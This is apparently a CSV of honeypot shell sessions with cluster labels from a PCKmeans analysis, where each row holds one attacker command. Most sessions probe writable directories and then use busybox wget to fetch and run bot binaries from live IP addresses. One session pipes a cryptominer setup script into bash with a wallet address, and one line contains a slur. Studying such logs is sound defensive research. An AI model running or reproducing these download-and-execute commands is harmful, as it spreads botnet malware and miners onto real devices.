session,PCKmeans_exp_result,Unnamed: 0,duration,command_freq,input
ce2d6c9a590a,0,354,21.06158757209778,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,355,21.06158757209778,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,356,21.06158757209778,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,357,21.06158757209778,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,358,21.06158757209778,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,362,21.06158757209778,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,364,21.06158757209778,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,365,21.06158757209778,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,366,21.06158757209778,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,367,21.06158757209778,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,370,21.06158757209778,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,373,21.06158757209778,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,375,21.06158757209778,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,377,21.06158757209778,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,379,21.06158757209778,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,381,21.06158757209778,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,383,21.06158757209778,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
ce2d6c9a590a,0,384,21.06158757209778,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
ce2d6c9a590a,0,385,21.06158757209778,26,wget
ce2d6c9a590a,0,386,21.06158757209778,26,tftp
ce2d6c9a590a,0,387,21.06158757209778,26,ftpget
ce2d6c9a590a,0,389,21.06158757209778,26,/bin/busybox wget http://185.243.56.167/bot_x86_64_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.x86_64; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
ce2d6c9a590a,0,390,21.06158757209778,26,wget http://185.243.56.167/bot_x86_64_el -O-
c2c06d212c26,1,359,2.401838302612304,4,shell
c2c06d212c26,1,360,2.401838302612304,4,shell
c2c06d212c26,1,361,2.401838302612304,4,sh
c2c06d212c26,1,363,2.401838302612304,4,cat /bin/busybox
2e64a073689a,0,368,21.011593103408813,26,shell
2e64a073689a,0,369,21.011593103408813,26,shell
2e64a073689a,0,371,21.011593103408813,26,sh
2e64a073689a,0,372,21.011593103408813,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,374,21.011593103408813,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,376,21.011593103408813,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,378,21.011593103408813,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,380,21.011593103408813,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,382,21.011593103408813,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,388,21.011593103408813,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,391,21.011593103408813,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,392,21.011593103408813,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,393,21.011593103408813,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,394,21.011593103408813,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,395,21.011593103408813,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,396,21.011593103408813,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,397,21.011593103408813,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,398,21.011593103408813,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,399,21.011593103408813,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,400,21.011593103408813,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
2e64a073689a,0,401,21.011593103408813,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
2e64a073689a,0,402,21.011593103408813,26,wget
2e64a073689a,0,403,21.011593103408813,26,tftp
2e64a073689a,0,404,21.011593103408813,26,ftpget
2e64a073689a,0,405,21.011593103408813,26,/bin/busybox wget http://185.243.56.167/bot_arc_a5_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.arc_a5; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
2e64a073689a,0,406,21.011593103408813,26,wget http://185.243.56.167/bot_arc_a5_el -O-
bbe52cff1a69,0,407,0.743133306503295,2,cd /tmp; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA; wget http://179.43.175.170/putkite/quickr1n.sh; curl -O http://179.43.175.170/putkite/quickr1n.sh; chmod 777 *; sh quickr1n.sh; echo storytime
bbe52cff1a69,0,408,0.743133306503295,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
27b50618ce6a,2,409,1.172374486923217,13,enable
27b50618ce6a,2,410,1.172374486923217,13,system
27b50618ce6a,2,411,1.172374486923217,13,system
27b50618ce6a,2,412,1.172374486923217,13,shell
27b50618ce6a,2,413,1.172374486923217,13,shell
27b50618ce6a,2,414,1.172374486923217,13,sh
27b50618ce6a,2,415,1.172374486923217,13,cat /proc/mounts; /bin/busybox ZLRMX
27b50618ce6a,2,416,1.172374486923217,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZLRMX
27b50618ce6a,2,417,1.172374486923217,13,tftp; wget; /bin/busybox ZLRMX
27b50618ce6a,2,418,1.172374486923217,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
27b50618ce6a,2,419,1.172374486923217,13,while read i
27b50618ce6a,2,420,1.172374486923217,13,/bin/busybox ZLRMX
27b50618ce6a,2,421,1.172374486923217,13,rm .s; exit
b6cd8f4bc824,1,422,1.6783287525177002,4,shell
b6cd8f4bc824,1,423,1.6783287525177002,4,shell
b6cd8f4bc824,1,424,1.6783287525177002,4,sh
b6cd8f4bc824,1,425,1.6783287525177002,4,cat /bin/busybox
8369a6aebafd,0,426,18.63800930976868,26,shell
8369a6aebafd,0,427,18.63800930976868,26,shell
8369a6aebafd,0,428,18.63800930976868,26,sh
8369a6aebafd,0,429,18.63800930976868,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,430,18.63800930976868,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,431,18.63800930976868,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,432,18.63800930976868,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,435,18.63800930976868,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,436,18.63800930976868,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,439,18.63800930976868,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,440,18.63800930976868,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,441,18.63800930976868,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,444,18.63800930976868,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,446,18.63800930976868,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,447,18.63800930976868,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,449,18.63800930976868,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,451,18.63800930976868,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,453,18.63800930976868,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,458,18.63800930976868,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,460,18.63800930976868,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
8369a6aebafd,0,461,18.63800930976868,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
8369a6aebafd,0,462,18.63800930976868,26,wget
8369a6aebafd,0,463,18.63800930976868,26,tftp
8369a6aebafd,0,464,18.63800930976868,26,ftpget
8369a6aebafd,0,466,18.63800930976868,26,/bin/busybox wget http://185.243.56.167/bot_sh_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.sh; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
8369a6aebafd,0,467,18.63800930976868,26,wget http://185.243.56.167/bot_sh_el -O-
03060ee904f4,1,433,1.564405679702758,4,shell
03060ee904f4,1,434,1.564405679702758,4,shell
03060ee904f4,1,437,1.564405679702758,4,sh
03060ee904f4,1,438,1.564405679702758,4,cat /bin/busybox
f7d670015a44,0,442,18.25634264945984,26,shell
f7d670015a44,0,443,18.25634264945984,26,shell
f7d670015a44,0,445,18.25634264945984,26,sh
f7d670015a44,0,448,18.25634264945984,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,450,18.25634264945984,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,452,18.25634264945984,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,454,18.25634264945984,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,455,18.25634264945984,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,456,18.25634264945984,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,457,18.25634264945984,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,459,18.25634264945984,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,465,18.25634264945984,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,468,18.25634264945984,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,469,18.25634264945984,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,470,18.25634264945984,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,471,18.25634264945984,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,472,18.25634264945984,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,473,18.25634264945984,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,474,18.25634264945984,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,475,18.25634264945984,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
f7d670015a44,0,476,18.25634264945984,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
f7d670015a44,0,477,18.25634264945984,26,wget
f7d670015a44,0,478,18.25634264945984,26,tftp
f7d670015a44,0,479,18.25634264945984,26,ftpget
f7d670015a44,0,480,18.25634264945984,26,/bin/busybox wget http://185.243.56.167/bot_mn10300_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.mn10300; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
f7d670015a44,0,481,18.25634264945984,26,wget http://185.243.56.167/bot_mn10300_el -O-
850426867a45,1,482,12.754497766494753,4,shell
850426867a45,1,483,12.754497766494753,4,shell
850426867a45,1,484,12.754497766494753,4,sh
850426867a45,1,485,12.754497766494753,4,cat /bin/busybox
19a1bc2b85e7,1,486,0.393481492996215,1,scp -t /tmp/YiRXmMpc
0229492d3f44,0,487,0.409438848495483,3,cd /tmp && chmod +x YiRXmMpc && bash -c ./YiRXmMpc
0229492d3f44,0,488,0.409438848495483,3,./YiRXmMpc
0229492d3f44,0,489,0.409438848495483,3,./YiRXmMpc
da6ec546fcf2,2,490,0.834627151489257,13,enable
da6ec546fcf2,2,491,0.834627151489257,13,system
da6ec546fcf2,2,492,0.834627151489257,13,system
da6ec546fcf2,2,493,0.834627151489257,13,shell
da6ec546fcf2,2,494,0.834627151489257,13,shell
da6ec546fcf2,2,495,0.834627151489257,13,sh
da6ec546fcf2,2,496,0.834627151489257,13,cat /proc/mounts; /bin/busybox AZQOE
da6ec546fcf2,2,497,0.834627151489257,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AZQOE
da6ec546fcf2,2,498,0.834627151489257,13,tftp; wget; /bin/busybox AZQOE
da6ec546fcf2,2,499,0.834627151489257,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
da6ec546fcf2,2,500,0.834627151489257,13,while read i
da6ec546fcf2,2,501,0.834627151489257,13,/bin/busybox AZQOE
da6ec546fcf2,2,502,0.834627151489257,13,rm .s; exit
e3767079b6fe,1,503,2.412325143814087,4,shell
e3767079b6fe,1,504,2.412325143814087,4,shell
e3767079b6fe,1,505,2.412325143814087,4,sh
e3767079b6fe,1,506,2.412325143814087,4,cat /bin/busybox
625743e7714f,2,507,2.139487743377685,13,enable
625743e7714f,2,508,2.139487743377685,13,system
625743e7714f,2,509,2.139487743377685,13,system
625743e7714f,2,510,2.139487743377685,13,shell
625743e7714f,2,511,2.139487743377685,13,shell
625743e7714f,2,512,2.139487743377685,13,sh
625743e7714f,2,513,2.139487743377685,13,cat /proc/mounts; /bin/busybox VOKXC
625743e7714f,2,514,2.139487743377685,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VOKXC
625743e7714f,2,515,2.139487743377685,13,tftp; wget; /bin/busybox VOKXC
625743e7714f,2,516,2.139487743377685,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
625743e7714f,2,517,2.139487743377685,13,while read i
625743e7714f,2,518,2.139487743377685,13,/bin/busybox VOKXC
625743e7714f,2,519,2.139487743377685,13,rm .s; exit
1f268f1e9a7c,1,520,6.503978967666626,4,shell
1f268f1e9a7c,1,521,6.503978967666626,4,shell
1f268f1e9a7c,1,522,6.503978967666626,4,sh
1f268f1e9a7c,1,523,6.503978967666626,4,cat /bin/busybox
b7af35902e6f,1,524,2.525197982788086,4,shell
b7af35902e6f,1,525,2.525197982788086,4,shell
b7af35902e6f,1,526,2.525197982788086,4,sh
b7af35902e6f,1,527,2.525197982788086,4,cat /bin/busybox
e7590a27a345,1,528,1.975313901901245,4,shell
e7590a27a345,1,529,1.975313901901245,4,shell
e7590a27a345,1,530,1.975313901901245,4,sh
e7590a27a345,1,531,1.975313901901245,4,cat /bin/busybox
ed606a2e91c9,1,532,2.154769897460937,4,shell
ed606a2e91c9,1,533,2.154769897460937,4,shell
ed606a2e91c9,1,534,2.154769897460937,4,sh
ed606a2e91c9,1,535,2.154769897460937,4,cat /bin/busybox
243c00af361a,0,536,60.30897045135498,1,wget 209.141.33.122/x86; chmod 777 x86; ./x86 nigga
8c72074041a5,0,537,14.989102125167848,19,start
8c72074041a5,0,538,14.989102125167848,19,start
8c72074041a5,0,539,14.989102125167848,19,enable
8c72074041a5,0,540,14.989102125167848,19,config terminal
8c72074041a5,0,541,14.989102125167848,19,config terminal
8c72074041a5,0,542,14.989102125167848,19,system
8c72074041a5,0,543,14.989102125167848,19,system
8c72074041a5,0,544,14.989102125167848,19,linuxshell
8c72074041a5,0,545,14.989102125167848,19,linuxshell
8c72074041a5,0,546,14.989102125167848,19,su
8c72074041a5,0,547,14.989102125167848,19,shell
8c72074041a5,0,548,14.989102125167848,19,shell
8c72074041a5,0,549,14.989102125167848,19,sh
8c72074041a5,0,550,14.989102125167848,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
8c72074041a5,0,551,14.989102125167848,19,echo -ne \x45\x4c\x46
8c72074041a5,0,552,14.989102125167848,19,/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
8c72074041a5,0,553,14.989102125167848,19,wget
8c72074041a5,0,554,14.989102125167848,19,echo -ne \x45\x4c\x46
8c72074041a5,0,555,14.989102125167848,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
18e7adda8252,2,556,4.523862600326538,13,enable
18e7adda8252,2,557,4.523862600326538,13,system
18e7adda8252,2,558,4.523862600326538,13,system
18e7adda8252,2,559,4.523862600326538,13,shell
18e7adda8252,2,560,4.523862600326538,13,shell
18e7adda8252,2,561,4.523862600326538,13,sh
18e7adda8252,2,562,4.523862600326538,13,cat /proc/mounts; /bin/busybox PVNEV
18e7adda8252,2,563,4.523862600326538,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PVNEV
18e7adda8252,2,564,4.523862600326538,13,tftp; wget; /bin/busybox PVNEV
18e7adda8252,2,565,4.523862600326538,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
18e7adda8252,2,566,4.523862600326538,13,while read i
18e7adda8252,2,567,4.523862600326538,13,/bin/busybox PVNEV
18e7adda8252,2,568,4.523862600326538,13,rm .s; exit
8b5546d2d6c8,1,569,1.222063779830932,1,wget
102face67ea4,2,570,2.506415605545044,13,enable
102face67ea4,2,571,2.506415605545044,13,system
102face67ea4,2,572,2.506415605545044,13,system
102face67ea4,2,573,2.506415605545044,13,shell
102face67ea4,2,574,2.506415605545044,13,shell
102face67ea4,2,575,2.506415605545044,13,sh
102face67ea4,2,576,2.506415605545044,13,cat /proc/mounts; /bin/busybox WIBLH
102face67ea4,2,577,2.506415605545044,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WIBLH
102face67ea4,2,578,2.506415605545044,13,tftp; wget; /bin/busybox WIBLH
102face67ea4,2,579,2.506415605545044,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
102face67ea4,2,580,2.506415605545044,13,while read i
102face67ea4,2,581,2.506415605545044,13,/bin/busybox WIBLH
102face67ea4,2,582,2.506415605545044,13,rm .s; exit
f87cc040d1af,2,583,2.955207347869873,13,enable
f87cc040d1af,2,584,2.955207347869873,13,system
f87cc040d1af,2,585,2.955207347869873,13,system
f87cc040d1af,2,586,2.955207347869873,13,shell
f87cc040d1af,2,587,2.955207347869873,13,shell
f87cc040d1af,2,588,2.955207347869873,13,sh
f87cc040d1af,2,589,2.955207347869873,13,cat /proc/mounts; /bin/busybox VDLNA
f87cc040d1af,2,590,2.955207347869873,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VDLNA
